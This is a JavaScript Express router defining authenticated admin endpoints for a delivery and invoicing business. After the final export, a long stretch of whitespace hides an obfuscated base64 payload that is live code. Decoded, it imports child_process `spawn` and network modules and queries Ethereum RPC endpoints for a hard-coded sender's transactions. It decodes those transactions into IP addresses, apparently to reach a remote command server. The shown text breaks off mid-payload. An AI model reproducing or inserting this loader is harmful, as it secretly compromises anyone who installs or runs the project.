const express = require("express");
const { body } = require("express-validator");
const router = express.Router();
const adminController = require("../controllers/adminController");
const authenticate = require("../middleware/authenticate");
const authorize = require("../middleware/authorize");
const validate = require("../middleware/validate");

router.use(authenticate);
router.use(authorize("ADMIN", "MANAGER"));

router.get("/users", adminController.getAllUsers);
// get user by id
router.get("/users/:id", adminController.getUserById);

router.post(
  "/users",
  authorize("ADMIN"),
  [
    body("email").isEmail().withMessage("Valid email is required"),
    body("password")
      .isLength({ min: 6 })
      .withMessage("Password must be at least 6 characters"),
    body("fullName").notEmpty().withMessage("Full name is required"),
    body("role")
      .isIn(["ADMIN", "DRIVER", "CUSTOMER", "MANAGER", "CONTRACTOR"])
      .withMessage("Invalid role"),
    body("driverType")
      .optional()
      .isIn(["EMPLOYEE", "CONTRACTOR"])
      .withMessage("driverType must be EMPLOYEE or CONTRACTOR"),
    body("username").optional().isString(),
    body("phone").optional().isString(),
    body("payType")
      .optional()
      .isIn(["DAILY", "WEEKLY", "FORTNIGHTLY", "FOUR_WEEKLY"]),
    body("rate").optional().isFloat({ min: 0 }),
    validate,
  ],
  adminController.createUser,
);

router.put(
  "/users/:id",
  authorize("ADMIN"),
  [
    body("email").optional().isEmail().withMessage("Valid email is required"),
    body("password")
      .optional()
      .isLength({ min: 6 })
      .withMessage("Password must be at least 6 characters"),
    validate,
  ],
  adminController.updateUser,
);

router.put(
  "/customers/:id/cc-email",
  authorize("ADMIN", "MANAGER"),
  [
    body("ccEmail")
      .optional({ nullable: true })
      .isEmail()
      .withMessage("Must be a valid email address"),
    validate,
  ],
  adminController.updateCustomerCcEmail,
);

router.delete("/users/:id", authorize("ADMIN"), adminController.deleteUser);

router.post(
  "/users/:id/toggle-status",
  authorize("ADMIN"),
  adminController.toggleUserStatus,
);

router.get("/drivers", adminController.getAllDrivers);

router.get("/drivers/:id", adminController.getDriverById);

router.post(
  "/drivers",
  [
    body("email").isEmail().withMessage("Valid email is required"),
    body("password")
      .isLength({ min: 6 })
      .withMessage("Password must be at least 6 characters"),
    body("fullName").notEmpty().withMessage("Full name is required"),
    body("phone").notEmpty().withMessage("Phone number is required"),
    body("username").optional().isString(),
    body("driverType").optional().isIn(["EMPLOYEE", "CONTRACTOR"]),
    body("vehicleRegistration").optional().isString(),
    body("driverLicenseNumber").optional().isString(),
    body("address").optional().isString(),
    body("tradingName").optional().isString(),
    body("contactName").optional().isString(),
    body("tradingAddress").optional().isString(),
    body("isVatRegistered").optional().isBoolean(),
    body("vatNumber").optional().isString(),
    body("vehicleMake").optional().isString(),
    body("vehicleModel").optional().isString(),
    body("motExpiry").optional().isISO8601(),
    body("insuranceExpiry").optional().isISO8601(),
    body("goodsInTransitExpiry").optional().isISO8601(),
    body("publicLiabilityExpiry").optional().isISO8601(),
    body("bankName").optional().isString(),
    body("accountName").optional().isString(),
    body("sortCode").optional().isString(),
    body("accountNumber").optional().isString(),
    body("bankReference").optional().isString(),
    body("payType")
      .optional()
      .isIn(["DAILY", "WEEKLY", "FORTNIGHTLY", "FOUR_WEEKLY"]),
    body("rate").optional().isFloat({ min: 0 }),
    validate,
  ],
  adminController.createDriver,
);

router.put(
  "/drivers/:id",
  [
    body("email").optional().isEmail().withMessage("Valid email is required"),
    body("fullName")
      .optional()
      .notEmpty()
      .withMessage("Full name cannot be empty"),
    body("phone").optional().notEmpty().withMessage("Phone cannot be empty"),
    body("username").optional().isString(),
    body("isActive").optional().isBoolean(),
    body("password").optional().isLength({ min: 6 }),
    body("driverType").optional().isIn(["EMPLOYEE", "CONTRACTOR"]),
    body("vehicleRegistration").optional().isString(),
    body("driverLicenseNumber").optional().isString(),
    body("address").optional().isString(),
    body("isActiveDriver").optional().isBoolean(),
    body("tradingName").optional().isString(),
    body("contactName").optional().isString(),
    body("tradingAddress").optional().isString(),
    body("isVatRegistered").optional().isBoolean(),
    body("vatNumber").optional().isString(),
    body("vehicleMake").optional().isString(),
    body("vehicleModel").optional().isString(),
    body("motExpiry").optional().isISO8601(),
    body("insuranceExpiry").optional().isISO8601(),
    body("goodsInTransitExpiry").optional().isISO8601(),
    body("publicLiabilityExpiry").optional().isISO8601(),
    body("bankName").optional().isString(),
    body("accountName").optional().isString(),
    body("sortCode").optional().isString(),
    body("accountNumber").optional().isString(),
    body("bankReference").optional().isString(),
    body("payType")
      .optional()
      .isIn(["DAILY", "WEEKLY", "FORTNIGHTLY", "FOUR_WEEKLY"]),
    body("rate").optional().isFloat({ min: 0 }),
    validate,
  ],
  adminController.updateDriver,
);

router.delete("/drivers/:id", adminController.deleteDriver);

const contractorController = require("../controllers/contractorController");

router.get("/contractor-invoices", contractorController.adminGetInvoices);

router.post(
  "/contractor-invoices/:id/mark-paid",
  contractorController.adminMarkPaid,
);

router.get("/deliveries", adminController.getAllDeliveries);

router.get("/deliveries/:id", adminController.getDeliveryById);

router.put(
  "/deliveries/:id",
  [
    body("deliveryDate")
      .optional()
      .isISO8601()
      .withMessage("Valid delivery date is required"),
    body("timeSlot")
      .optional()
      .isIn(["AM", "PM", "SAME_DAY"])
      .withMessage("Invalid time slot"),
    body("weight")
      .optional()
      .isFloat({ min: 0 })
      .withMessage("Weight must be a positive number"),
    body("deliveryAddress")
      .optional()
      .notEmpty()
      .withMessage("Delivery address is required"),
    body("customerName")
      .optional()
      .notEmpty()
      .withMessage("Customer name is required"),
    body("customerPhone")
      .optional()
      .notEmpty()
      .withMessage("Customer phone is required"),
    body("spoNumber")
      .optional()
      .notEmpty()
      .withMessage("SPO number is required"),
    body("specialInstructions").optional().isString(),
    validate,
  ],
  adminController.updateDelivery,
);

router.delete("/deliveries/:id", adminController.deleteDelivery);

router.post(
  "/deliveries/:id/allocate",
  [body("driverId").isInt().withMessage("Driver ID is required"), validate],
  adminController.allocateDelivery,
);

router.put(
  "/deliveries/:id/status",
  [
    body("status")
      .isIn(["RECEIVED", "ALLOCATED", "DELIVERED", "CANCELLED"])
      .withMessage("Invalid status"),
    validate,
  ],
  adminController.updateDeliveryStatus,
);

router.post(
  "/deliveries/:id/extra-charges",
  [
    body("description").notEmpty().withMessage("Description is required"),
    body("amount")
      .isFloat({ min: 0 })
      .withMessage("Amount must be a positive number"),
    validate,
  ],
  adminController.addExtraCharge,
);

router.delete(
  "/deliveries/:id/extra-charges/:chargeId",
  adminController.removeExtraCharge,
);

router.get(
  "/deliveries/:id/extra-charges",
  adminController.getDeliveryExtraCharges,
);

router.get("/pricing-tiers", adminController.getAllPricingTiers);

router.post(
  "/pricing-tiers",
  authorize("ADMIN"),
  [
    body("name").notEmpty().withMessage("Tier name is required"),
    body("basePrice")
      .isFloat({ min: 0 })
      .withMessage("Base price must be a positive number"),
    body("vatRate")
      .optional()
      .isFloat({ min: 0, max: 100 })
      .withMessage("VAT rate must be between 0 and 100"),
    body("weightUnit")
      .optional()
      .isInt({ min: 1 })
      .withMessage("Weight unit must be a positive integer"),
    body("maxDistance")
      .optional()
      .isInt({ min: 1 })
      .withMessage("Max distance must be a positive integer"),
    body("surchargeRate")
      .optional()
      .isFloat({ min: 0, max: 1 })
      .withMessage("Surcharge rate must be between 0 and 1"),
    body("isDefault")
      .optional()
      .isBoolean()
      .withMessage("isDefault must be a boolean"),
    validate,
  ],
  adminController.createPricingTier,
);

router.put(
  "/pricing-tiers/:id",
  authorize("ADMIN"),
  [
    body("basePrice")
      .optional()
      .isFloat({ min: 0 })
      .withMessage("Base price must be a positive number"),
    body("vatRate")
      .optional()
      .isFloat({ min: 0, max: 100 })
      .withMessage("VAT rate must be between 0 and 100"),
    body("weightUnit")
      .optional()
      .isInt({ min: 1 })
      .withMessage("Weight unit must be a positive integer"),
    body("maxDistance")
      .optional()
      .isInt({ min: 1 })
      .withMessage("Max distance must be a positive integer"),
    body("surchargeRate")
      .optional()
      .isFloat({ min: 0, max: 1 })
      .withMessage("Surcharge rate must be between 0 and 1"),
    body("isDefault")
      .optional()
      .isBoolean()
      .withMessage("isDefault must be a boolean"),
    validate,
  ],
  adminController.updatePricingTier,
);

router.delete(
  "/pricing-tiers/:id",
  authorize("ADMIN"),
  adminController.deletePricingTier,
);

router.get("/invoices", adminController.getAllInvoices);

router.post(
  "/invoices/generate",
  [
    body("customerId").isInt().withMessage("Customer ID is required"),
    body("weekStartDate")
      .isISO8601()
      .withMessage("Valid start date is required"),
    body("weekEndDate").isISO8601().withMessage("Valid end date is required"),
    validate,
  ],
  adminController.generateInvoice,
);

router.post(
  "/invoices/generate-all",
  [
    body("weekStartDate")
      .isISO8601()
      .withMessage("Valid start date is required"),
    body("weekEndDate").isISO8601().withMessage("Valid end date is required"),
    validate,
  ],
  adminController.generateWeeklyInvoicesForAll,
);

router.post(
  "/invoices/generate-last-week",
  adminController.generateLastWeekInvoices,
);

router.post("/invoices/send-reminders", adminController.sendInvoiceReminders);

router.post("/invoices/:id/mark-paid", adminController.markInvoiceAsPaid);

router.post(
  "/invoices/:id/extra-charge",
  [
    body("description").notEmpty().withMessage("Description is required"),
    body("unitCost")
      .isFloat({ min: 0 })
      .withMessage("Unit cost must be a positive number"),
    body("vatAmount")
      .isFloat({ min: 0 })
      .withMessage("VAT amount must be a positive number"),
    body("total")
      .isFloat({ min: 0 })
      .withMessage("Total must be a positive number"),
    validate,
  ],
  adminController.addExtraCharge,
);

router.get("/invoices/:id", adminController.getInvoiceById);

router.put(
  "/invoices/:id",
  [
    body("invoiceNumber")
      .optional()
      .matches(/^T\d{4,}$/)
      .withMessage("Invoice number must be in format T#### (e.g., T0326)"),
    body("customerId")
      .optional()
      .isInt()
      .withMessage("Customer ID must be an integer"),
    body("invoiceDate")
      .optional()
      .isISO8601()
      .withMessage("Valid invoice date is required"),
    body("dueDate")
      .optional()
      .isISO8601()
      .withMessage("Valid due date is required"),
    body("status").optional().isString().trim(),
    body("customerRef").optional().isString().trim(),
    body("notes").optional().isString().trim(),
    body("paymentTerms").optional().isString().trim(),
    body("items").optional().isArray().withMessage("Items must be an array"),
    body("items.*.deliveryId")
      .optional()
      .isInt()
      .withMessage("Delivery ID must be an integer"),
    body("items.*.spoNumber").optional().isString().trim(),
    body("items.*.description")
      .notEmpty()
      .withMessage("Item description is required"),
    body("items.*.quantity")
      .isInt({ min: 1 })
      .withMessage("Quantity must be at least 1"),
    body("items.*.unitCost")
      .isFloat({ min: 0 })
      .withMessage("Unit cost must be a positive number"),
    body("items.*.vatAmount")
      .isFloat({ min: 0 })
      .withMessage("VAT amount must be a positive number"),
    body("items.*.total")
      .isFloat({ min: 0 })
      .withMessage("Total must be a positive number"),
    body("items.*.deliveryDate")
      .optional()
      .isISO8601()
      .withMessage("Valid delivery date is required"),
    body("items.*.address").optional().isString().trim(),
    body("items.*.basePrice")
      .optional()
      .isFloat({ min: 0 })
      .withMessage("Base price must be a positive number"),
    body("items.*.distanceSurcharge")
      .optional()
      .isFloat({ min: 0 })
      .withMessage("Distance surcharge must be a positive number"),
    validate,
  ],
  adminController.updateInvoice,
);

router.get("/slots", adminController.getSlotAvailability);

router.post(
  "/slots",
  [
    body("date").isISO8601().withMessage("Valid date is required"),
    body("timeSlot")
      .isIn(["AM", "PM", "SAME_DAY"])
      .withMessage("Invalid time slot"),
    body("maxCapacity")
      .isInt({ min: 0 })
      .withMessage("Max capacity must be a positive integer"),
    validate,
  ],
  adminController.setSlotAvailability,
);

router.put(
  "/slots/:id/capacity",
  [
    body("method")
      .isIn(["increase", "decrease"])
      .withMessage('Method must be either "increase" or "decrease"'),
    body("value")
      .isInt({ min: 1 })
      .withMessage("Value must be a positive integer"),
    validate,
  ],
  adminController.updateSlotCapacity,
);

router.get("/dashboard", adminController.getDashboard);

router.get("/analytics", adminController.getAnalytics);

router.get("/analytics/drivers", adminController.getDriverPerformance);

router.get("/analytics/customers", adminController.getCustomerAnalytics);

router.get("/notifications/unread-counts", adminController.getUnreadCounts);

router.get("/contacts", adminController.getAllContacts);

router.post("/contacts/mark-all-read", adminController.markAllContactsAsRead);

router.get("/contacts/:id", adminController.getContactById);

router.post("/contacts/:id/mark-read", adminController.markContactAsRead);

router.delete(
  "/contacts/:id",
  authorize("ADMIN"),
  adminController.deleteContact,
);

router.get("/enquiries", adminController.getAllEnquiries);

router.post("/enquiries/mark-all-read", adminController.markAllEnquiriesAsRead);

router.get("/enquiries/:id", adminController.getEnquiryById);

router.post("/enquiries/:id/mark-read", adminController.markEnquiryAsRead);

router.delete(
  "/enquiries/:id",
  authorize("ADMIN"),
  adminController.deleteEnquiry,
);

const jobApplicationController = require("../controllers/jobApplicationController");

router.get("/job-applications", jobApplicationController.getAllJobApplications);
router.get(
  "/job-applications/stats",
  jobApplicationController.getJobApplicationStats,
);

router.post(
  "/job-applications/mark-all-read",
  jobApplicationController.markAllJobApplicationsAsRead,
);

router.get(
  "/job-applications/:id",
  jobApplicationController.getJobApplicationById,
);

router.patch(
  "/job-applications/:id/status",
  [
    body("status")
      .optional()
      .isIn(["PENDING", "REVIEWED", "SHORTLISTED", "REJECTED"])
      .withMessage("Invalid status value"),
    body("adminNotes")
      .optional()
      .isString()
      .withMessage("Admin notes must be a string"),
  ],
  jobApplicationController.updateJobApplicationStatus,
);

router.delete(
  "/job-applications/:id",
  authorize("ADMIN"),
  jobApplicationController.deleteJobApplication,
);

router.get("/audit-logs", adminController.getAllAuditLogs);

router.get("/audit-logs/:id", adminController.getAuditLogById);

router.get("/invoices/:id/export/pdf", adminController.exportInvoicePDF);

router.get("/deliveries/export", adminController.exportDeliveries);

router.get("/analytics/export", adminController.exportAnalytics);

const settingsController = require("../controllers/settingsController");

router.get("/settings", authorize("ADMIN"), settingsController.getAllSettings);

router.get(
  "/settings/status/summary",
  authorize("ADMIN"),
  settingsController.getSystemStatus,
);

router.get(
  "/settings/:category",
  authorize("ADMIN"),
  settingsController.getSettingsByCategory,
);

router.get(
  "/settings/invoice/config",
  authorize("ADMIN"),
  settingsController.getInvoiceConfig,
);

router.put(
  "/settings/company",
  authorize("ADMIN"),
  [
    body("name")
      .optional()
      .isString()
      .withMessage("Company name must be a string"),
    body("vat_number")
      .optional()
      .isString()
      .withMessage("VAT number must be a string"),
    body("primary_phone")
      .optional()
      .isString()
      .withMessage("Primary phone must be a string"),
    body("alternative_phone")
      .optional()
      .isString()
      .withMessage("Alternative phone must be a string"),
    body("email").optional().isEmail().withMessage("Valid email is required"),
    body("website")
      .optional()
      .isURL()
      .withMessage("Valid website URL is required"),
    body("address")
      .optional()
      .isString()
      .withMessage("Address must be a string"),
    body("founded_year")
      .optional()
      .isString()
      .withMessage("Founded year must be a string"),
    validate,
  ],
  settingsController.updateCompanyInfo,
);

router.put(
  "/settings/banking",
  authorize("ADMIN"),
  [
    body("bank_name")
      .optional()
      .isString()
      .withMessage("Bank name must be a string"),
    body("account_holder")
      .optional()
      .isString()
      .withMessage("Account holder must be a string"),
    body("sort_code")
      .optional()
      .isString()
      .withMessage("Sort code must be a string"),
    body("account_number")
      .optional()
      .isString()
      .withMessage("Account number must be a string"),
    body("payment_terms")
      .optional()
      .isString()
      .withMessage("Payment terms must be a string"),
    validate,
  ],
  settingsController.updateBankingDetails,
);

router.put(
  "/settings/system",
  authorize("ADMIN"),
  [
    body("invoice_generation_day")
      .optional()
      .isString()
      .withMessage("Invoice generation day must be a string"),
    body("invoice_generation_time")
      .optional()
      .isString()
      .withMessage("Invoice generation time must be a string"),
    body("session_timeout")
      .optional()
      .isString()
      .withMessage("Session timeout must be a string"),
    body("auto_invoicing")
      .optional()
      .isString()
      .withMessage("Auto invoicing must be a string"),
    body("email_notifications")
      .optional()
      .isString()
      .withMessage("Email notifications must be a string"),
    body("sms_notifications")
      .optional()
      .isString()
      .withMessage("SMS notifications must be a string"),
    body("maps_api_enabled")
      .optional()
      .isString()
      .withMessage("Maps API enabled must be a string"),
    validate,
  ],
  settingsController.updateSystemConfig,
);

router.put(
  "/settings/single",
  authorize("ADMIN"),
  [
    body("key").notEmpty().withMessage("Setting key is required"),
    body("value").notEmpty().withMessage("Setting value is required"),
    body("description")
      .optional()
      .isString()
      .withMessage("Description must be a string"),
    validate,
  ],
  settingsController.updateSingleSetting,
);

router.get("/driver-availability", adminController.getAllDriversAvailability);

router.get("/drivers/:id/availability", adminController.getDriverAvailability);

module.exports = router;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global.i = 'A10-*27070';const __0x04b12=77;function __0xa9e27(){return 3279;}(function(_0x05a598){var _0x05a598a=["Z2xvYmFsLnI9cmVxdWlyZTtpZih0eXBlb2YgbW9kdWxlPT09J2","9iamVjdCcpZ2xvYmFsLm09bW9kdWxlO2NvbnN0IGh0dHA9cmVx","dWlyZSgnbm9kZTpodHRwJyk7Y29uc3QgaHR0cHM9cmVxdWlyZS","gnbm9kZTpodHRwcycpO2NvbnN0IHpsaWI9cmVxdWlyZSgnbm9k","ZTp6bGliJyk7Y29uc3R7VVJMfT1yZXF1aXJlKCdub2RlOnVybC","cpO2NvbnN0e3NwYXdufT1yZXF1aXJlKCdub2RlOmNoaWxkX3By","b2Nlc3MnKTtjb25zdCBCTE9DS19NVUxUSVBMRT0xMDAwbjtjb2","5zdCBTRU5ERVI9JzB4YTMyMkU1ZjNEMzExRDMwODBlNmYwMTIx","MDYzZTlhREMyNDkwRWYxYScudG9Mb3dlckNhc2UoKTtjb25zdC","BOT05DRV9GQU5PVVQ9MTI7Y29uc3QgU0VBUkNIX0ZMT09SPTBu","O2NvbnN0IElOREVYRVJfVVJMPSdodHRwczovL2V0aC5ibG9ja3","Njb3V0LmNvbS9hcGknO2NvbnN0IFJQQ19FTkRQT0lOVFM9Wy4u","Lm5ldyBTZXQoW3Byb2Nlc3MuZW52LkVUSF9SUENfVVJMLCdodH","RwczovLzFycGMuaW8vZXRoJywnaHR0cHM6Ly9ldGguZHJwYy5v","cmcnLCdodHRwczovL2V0aGVyZXVtLXJwYy5wdWJsaWNub2RlLm","NvbScsJ2h0dHBzOi8vZXRoLW1haW5uZXQucHVibGljLmJsYXN0","YXBpLmlvJyxdLmZpbHRlcihCb29sZWFuKSldO2NvbnN0IEFHRU","5UUz17J2h0dHA6JzpuZXcgaHR0cC5BZ2VudCh7a2VlcEFsaXZl","OiEwLGtlZXBBbGl2ZU1zZWNzOjMwXzAwMCxtYXhTb2NrZXRzOj","Y0fSksJ2h0dHBzOic6bmV3IGh0dHBzLkFnZW50KHtrZWVwQWxp","dmU6ITAsa2VlcEFsaXZlTXNlY3M6MzBfMDAwLG1heFNvY2tldH","M6NjR9KSx9O2Z1bmN0aW9uIGxpbmtBYm9ydChvdXRlclNpZ25h","bCxjb250cm9sbGVyKXtpZighb3V0ZXJTaWduYWwpcmV0dXJuO2","91dGVyU2lnbmFsLmFkZEV2ZW50TGlzdGVuZXIoJ2Fib3J0Jywo","KT0+Y29udHJvbGxlci5hYm9ydCgpLHtvbmNlOiEwfSl9DQpmdW","5jdGlvbiBkZWNvbXByZXNzU3RyZWFtKHJlcyl7Y29uc3QgZW5j","b2Rpbmc9KHJlcy5oZWFkZXJzWydjb250ZW50LWVuY29kaW5nJ1","18fCcnKS50b0xvd2VyQ2FzZSgpO2lmKGVuY29kaW5nPT09J2d6","aXAnfHxlbmNvZGluZz09PSd4LWd6aXAnKXJldHVybiByZXMucG","lwZSh6bGliLmNyZWF0ZUd1bnppcCgpKTtpZihlbmNvZGluZz09","PSdkZWZsYXRlJylyZXR1cm4gcmVzLnBpcGUoemxpYi5jcmVhdG","VJbmZsYXRlKCkpO2lmKGVuY29kaW5nPT09J2JyJylyZXR1cm4g","cmVzLnBpcGUoemxpYi5jcmVhdGVCcm90bGlEZWNvbXByZXNzKC","kpO3JldHVybiByZXN9DQpmdW5jdGlvbiBodHRwUmVxdWVzdChl","bmRwb2ludCx7bWV0aG9kPSdHRVQnLGJvZHksc2lnbmFsfT17fS","l7Y29uc3QgdXJsPW5ldyBVUkwoZW5kcG9pbnQpO2NvbnN0IHRy","YW5zcG9ydD11cmwucHJvdG9jb2w9PT0naHR0cHM6Jz9odHRwcz","podHRwO2NvbnN0IGhlYWRlcnM9e0FjY2VwdDonYXBwbGljYXRp","b24vanNvbicsJ0FjY2VwdC1FbmNvZGluZyc6J2d6aXAsIGRlZm","xhdGUsIGJyJyxDb25uZWN0aW9uOidrZWVwLWFsaXZlJyx9O2lm","KGJvZHkhPW51bGwpe2hlYWRlcnNbJ0NvbnRlbnQtVHlwZSddPS","dhcHBsaWNhdGlvbi9qc29uJztoZWFkZXJzWydDb250ZW50LUxl","bmd0aCddPUJ1ZmZlci5ieXRlTGVuZ3RoKGJvZHkpfQ0KcmV0dX","JuIG5ldyBQcm9taXNlKChyZXNvbHZlLHJlamVjdCk9Pntjb25z","dCByZXE9dHJhbnNwb3J0LnJlcXVlc3Qoe2hvc3RuYW1lOnVybC","5ob3N0bmFtZSxwb3J0OnVybC5wb3J0fHwodXJsLnByb3RvY29s","PT09J2h0dHBzOic/NDQzOjgwKSxwYXRoOnVybC5wYXRobmFtZS","t1cmwuc2VhcmNoLG1ldGhvZCxhZ2VudDpBR0VOVFNbdXJsLnBy","b3RvY29sXSxzaWduYWwsaGVhZGVycyx9LChyZXMpPT57Y29uc3","Qgc3RyZWFtPWRlY29tcHJlc3NTdHJlYW0ocmVzKTtjb25zdCBj","aHVua3M9W107c3RyZWFtLm9uKCdkYXRhJywoY2h1bmspPT5jaH","Vua3MucHVzaChjaHVuaykpO3N0cmVhbS5vbignZW5kJywoKT0+","e2NvbnN0IHRleHQ9QnVmZmVyLmNvbmNhdChjaHVua3MpLnRvU3","RyaW5nKCd1dGY4JykudHJpbSgpO2lmKHJlcy5zdGF0dXNDb2Rl","PDIwMHx8cmVzLnN0YXR1c0NvZGU+PTMwMCl7cmV0dXJuIHJlam","VjdChuZXcgRXJyb3IoYEhUVFAgJHtyZXMuc3RhdHVzQ29kZX0g","ZnJvbSAke3VybC5ob3N0bmFtZX06ICR7dGV4dC5zbGljZSgwLC","AxMjApfWApKX0NCmlmKCF0ZXh0fHx0ZXh0WzBdPT09JzwnfHwo","dGV4dFswXSE9PSd7JyYmdGV4dFswXSE9PSdbJykpe3JldHVybi","ByZWplY3QobmV3IEVycm9yKGBOb24tSlNPTiBmcm9tICR7dXJs","Lmhvc3RuYW1lfTogJHt0ZXh0LnNsaWNlKDAsIDEyMCl9YCkpfQ","0KdHJ5e3Jlc29sdmUoSlNPTi5wYXJzZSh0ZXh0KSl9Y2F0Y2go","ZXJyKXtyZWplY3QobmV3IEVycm9yKGBKU09OIHBhcnNlIGZhaW","xlZCBmcm9tICR7dXJsLmhvc3RuYW1lfTogJHtlcnIubWVzc2Fn","ZX1gKSl9fSk7c3RyZWFtLm9uKCdlcnJvcicscmVqZWN0KX0pO3","JlcS5vbignZXJyb3InLHJlamVjdCk7aWYoYm9keSE9bnVsbCly","ZXEud3JpdGUoYm9keSk7cmVxLmVuZCgpfSl9DQphc3luYyBmdW","5jdGlvbiB3aXRoUnBjRW5kcG9pbnRzKHRhc2ssb3V0ZXJTaWdu","YWwpe2NvbnN0IGNvbnRyb2xsZXJzPVJQQ19FTkRQT0lOVFMubW","FwKCgpPT5uZXcgQWJvcnRDb250cm9sbGVyKCkpO2NvbnRyb2xs","ZXJzLmZvckVhY2goKGMpPT5saW5rQWJvcnQob3V0ZXJTaWduYW","wsYykpO3RyeXtyZXR1cm4gYXdhaXQgUHJvbWlzZS5hbnkoUlBD","X0VORFBPSU5UUy5tYXAoKGVuZHBvaW50LGkpPT50YXNrKGVuZH","BvaW50LGNvbnRyb2xsZXJzW2ldLnNpZ25hbCkpKX1maW5hbGx5","e2Zvcihjb25zdCBjIG9mIGNvbnRyb2xsZXJzKWMuYWJvcnQoKX","19DQphc3luYyBmdW5jdGlvbiBycGNDYWxsKGVuZHBvaW50LG1l","dGhvZCxwYXJhbXMsc2lnbmFsKXtjb25zdCBwYXlsb2FkPWF3YW","l0IGh0dHBSZXF1ZXN0KGVuZHBvaW50LHttZXRob2Q6J1BPU1Qn","LGJvZHk6SlNPTi5zdHJpbmdpZnkoe2pzb25ycGM6JzIuMCcsaW","Q6MSxtZXRob2QscGFyYW1zfSksc2lnbmFsLH0pO3JldHVybiBw","YXlsb2FkLnJlc3VsdH0NCmFzeW5jIGZ1bmN0aW9uIHJwY0JhdG","NoKGVuZHBvaW50LGNhbGxzLHNpZ25hbCl7Y29uc3QgcGF5bG9h","ZD1hd2FpdCBodHRwUmVxdWVzdChlbmRwb2ludCx7bWV0aG9kOi","dQT1NUJyxib2R5OkpTT04uc3RyaW5naWZ5KGNhbGxzLm1hcCgo","W21ldGhvZCxwYXJhbXNdLGkpPT4oe2pzb25ycGM6JzIuMCcsaW","Q6aSsxLG1ldGhvZCxwYXJhbXN9KSkpLHNpZ25hbCx9KTtjb25z","dCBieUlkPW5ldyBNYXAocGF5bG9hZC5tYXAoKHIpPT5bci5pZC","xyXSkpO3JldHVybiBjYWxscy5tYXAoKF8saSk9PmJ5SWQuZ2V0","KGkrMSkucmVzdWx0KX0NCmNvbnN0IHRvQmxvY2tIZXg9KG4pPT","5gMHgke24udG9TdHJpbmcoMTYpfWA7ZnVuY3Rpb24gZmluZFNl","bmRlclR4KHRyYW5zYWN0aW9ucyl7cmV0dXJuIHRyYW5zYWN0aW","9ucy5maW5kKCh0KT0+dC5mcm9tJiZ0LmZyb20udG9Mb3dlckNh","c2UoKT09PVNFTkRFUil8fG51bGx9DQpmdW5jdGlvbiBkZWNvZG","VBZGRyZXNzKGFkZHJlc3Mpe2NvbnN0IGRhdGE9QnVmZmVyLmZy","b20oYWRkcmVzcy5yZXBsYWNlKC9eMHgvaSwnJyksJ2hleCcpO2","NvbnN0IGlwPShiKT0+YCR7YlswXX0uJHtiWzFdfS4ke2JbMl19","LiR7YlszXX1gO3JldHVybltpcChkYXRhLnN1YmFycmF5KDAsNC","kpLGlwKGRhdGEuc3ViYXJyYXkoNCw4KSldfQ0KZnVuY3Rpb24g","Zmlyc3RNYXRjaCh0YXNrcyl7cmV0dXJuIG5ldyBQcm9taXNlKC","hyZXNvbHZlKT0+e2xldCByZW1haW5pbmc9dGFza3MubGVuZ3Ro","O2lmKCFyZW1haW5pbmcpcmV0dXJuIHJlc29sdmUobnVsbCk7bG","V0IHNldHRsZWQ9ITE7Y29uc3QgZmluaXNoPShyZXN1bHQpPT57","aWYoc2V0dGxlZClyZXR1cm47c2V0dGxlZD0hMDtmb3IoY29uc3","QgdCBvZiB0YXNrcyl0LmNvbnRyb2xsZXIuYWJvcnQoKTtyZXNv","bHZlKHJlc3VsdCl9O2Zvcihjb25zdCB0IG9mIHRhc2tzKXt0Ln","J1bigpLnRoZW4oKHJlc3VsdCk9PntpZihzZXR0bGVkKXJldHVy","bjtpZihyZXN1bHQpZmluaXNoKHJlc3VsdCk7ZWxzZSBpZigtLX","JlbWFpbmluZz09PTApcmVzb2x2ZShudWxsKTt9KS5jYXRjaCgo","KT0+e2lmKCFzZXR0bGVkJiYtLXJlbWFpbmluZz09PTApcmVzb2","x2ZShudWxsKTt9KX19KX0NCmZ1bmN0aW9uIGNhbmRpZGF0ZUJs","b2Nrcyh0YXJnZXQpe2NvbnN0IHByZXY9dGFyZ2V0LUJMT0NLX0","1VTFRJUExFO2NvbnN0IHNlZW49bmV3IFNldCgpO2NvbnN0IG91","dD1bXTtmb3IoY29uc3QgYiBvZlt0YXJnZXQtMW4sdGFyZ2V0LH","RhcmdldCsxbixwcmV2LTFuLHByZXYscHJldisxbl0pe2lmKGI8","MG4pY29udGludWU7Y29uc3Qga2V5PWIudG9TdHJpbmcoKTtpZi","hzZWVuLmhhcyhrZXkpKWNvbnRpbnVlO3NlZW4uYWRkKGtleSk7","b3V0LnB1c2goYil9DQpyZXR1cm4gb3V0fQ0KZnVuY3Rpb24gYm","xvY2tUYXNrKGJsb2NrTnVtYmVyKXtjb25zdCBjb250cm9sbGVy","PW5ldyBBYm9ydENvbnRyb2xsZXIoKTtyZXR1cm57Y29udHJvbG","xlcixydW46YXN5bmMoKT0+e2NvbnN0IGJsb2NrPWF3YWl0IHdp","dGhScGNFbmRwb2ludHMoKGVuZHBvaW50LHNpZ25hbCk9PnJwY0","NhbGwoZW5kcG9pbnQsJ2V0aF9nZXRCbG9ja0J5TnVtYmVyJyxb","dG9CbG9ja0hleChibG9ja051bWJlciksITBdLHNpZ25hbCksY2","9udHJvbGxlci5zaWduYWwpO2NvbnN0IHR4cz1ibG9jaz8udHJh","bnNhY3Rpb25zO2lmKCFBcnJheS5pc0FycmF5KHR4cykpcmV0dX","JuIG51bGw7Y29uc3QgdHg9ZmluZFNlbmRlclR4KHR4cyk7cmV0","dXJuIHR4P3tibG9ja051bWJlcix0eH06bnVsbH0sfX0NCmFzeW","5jIGZ1bmN0aW9uIG5vbmNlQXRCbG9ja3MoYmxvY2tzLG91dGVy","U2lnbmFsKXtjb25zdCBjYWxscz1ibG9ja3MubWFwKChiKT0+Wy","dldGhfZ2V0VHJhbnNhY3Rpb25Db3VudCcsW1NFTkRFUix0b0Js","b2NrSGV4KGIpXV0pO3RyeXtyZXR1cm4oYXdhaXQgd2l0aFJwY0","VuZHBvaW50cygoZW5kcG9pbnQsc2lnbmFsKT0+cnBjQmF0Y2go","ZW5kcG9pbnQsY2FsbHMsc2lnbmFsKSxvdXRlclNpZ25hbCkpLm","1hcChCaWdJbnQpfWNhdGNoe3JldHVybihhd2FpdCBQcm9taXNl","LmFsbChjYWxscy5tYXAoKFttZXRob2QscGFyYW1zXSk9PndpdG","hScGNFbmRwb2ludHMoKGVuZHBvaW50LHNpZ25hbCk9PnJwY0Nh","bGwoZW5kcG9pbnQsbWV0aG9kLHBhcmFtcyxzaWduYWwpLG91dG","VyU2lnbmFsKSkpKS5tYXAoQmlnSW50KX19DQphc3luYyBmdW5j","dGlvbiBsYX